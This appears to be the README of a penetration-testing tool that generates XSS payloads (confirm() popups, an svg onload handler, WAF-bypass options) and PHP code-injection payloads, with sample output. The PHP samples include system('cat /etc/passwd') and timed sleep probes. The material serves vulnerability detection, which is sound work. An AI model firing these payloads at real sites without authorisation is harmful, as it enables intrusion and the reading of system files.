# Payload Generator
Payload Generator Tool. These payloads are only help to detect the vulnerability. 

- [x] XSS Payload Generation
- [ ] SSTI Payload Generation
- [ ] HTML Injection Payload Generation
- [ ] Open Redirection Payload Generation
- [ ] SQL Injection Payload Generation
- [ ] Command Injection Payload Generation
- [ ] SSI Injection Payload Generation
- [x] PHP Code Injection Payload Generation



## XSS Payloads

### Help

```bash
usage: generator.py xss [-h] [--popup] [--logger] [--oast] [--dom] [--ored] [--oast-domain] [--unique-string] [--waf] [--reverse-payloads] [--urlencode]

options:
  -h, --help          show this help message and exit

XSS Payload Types:
  --popup             Generate Popup Payloads
  --logger            Generate Console.log() Payloads
  --oast              Generate OAST Payloads
  --dom               Generate DOM Payloads
  --ored              Generate ORED Payloads

XSS Payload Options:
  --oast-domain       Set OAST Domain for payloads
  --unique-string     Set Unique String for testing

XSS Payload Mutations:
  --waf               Generate WAF Bypass Payloads
  --reverse-payloads  Generate Reverse Payloads
  --urlencode         Set URL Encoding for payload generator
```

### Generate Popup Payloads

```bash
python3 generator.py xss --popup 
confirm("yDrQfNiA5EdYHhmJIWMw")
confirm`yDrQfNiA5EdYHhmJIWMw`
(confirm`yDrQfNiA5EdYHhmJIWMw`)
{confirm`yDrQfNiA5EdYHhmJIWMw`}
[confirm`yDrQfNiA5EdYHhmJIWMw`]
(((confirm)))`yDrQfNiA5EdYHhmJIWMw`
new class extends confirm`yDrQfNiA5EdYHhmJIWMw`{}
["yDrQfNiA5EdYHhmJIWMw"].find(confirm)
[1337].map(confirm)
<svg/onload="confirm("yDrQfNiA5EdYHhmJIWMw")">
[...]
```

## PHP

### Help

```bash
usage: generator.py php [-h] [--oast-domain] [--unique-string] [--sleep-timeout] [--urlencode]

options:
  -h, --help        show this help message and exit

PHP CI Payload Options:
  --oast-domain     Set OAST Domain for payloads
  --unique-string   Set Unique String for testing
  --sleep-timeout   Set Sleep Timeout

PHP Payload Mutations:
  --urlencode       Set URL Encoding for payload generator
```


### Generate Payloads

```bash
system("cat /etc/passwd")
system("cat /etc/passwd");
;system("cat /etc/passwd");
<?php system("cat /etc/passwd"); ?>
system("sleep 17")
system("sleep 17");
;system("sleep 17");
<?php system("sleep 17"); ?>
system("timeout /T 17")
system("timeout /T 17");
;system("timeout /T 17");
<?php system("timeout /T 17"); ?>
system("echo PLmyJkJgSdo5iQ9lDAnH")
system("echo PLmyJkJgSdo5iQ9lDAnH");
;system("echo PLmyJkJgSdo5iQ9lDAnH");
<?php system("echo PLmyJkJgSdo5iQ9lDAnH"); ?>
[...]
```
